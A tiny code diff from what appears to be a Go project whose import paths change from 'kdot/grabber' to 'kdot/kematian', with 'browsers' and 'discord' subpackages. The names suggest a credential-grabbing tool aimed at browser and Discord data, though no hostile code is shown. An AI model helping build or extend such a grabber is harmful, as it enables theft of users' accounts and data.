@@ -1,8 +1,8 @@
 package main
 
 import (
-	"kdot/grabber/browsers"
-	"kdot/grabber/discord"
+	"kdot/kematian/browsers"
+	"kdot/kematian/discord"
 	"os"
 	"sync"
 
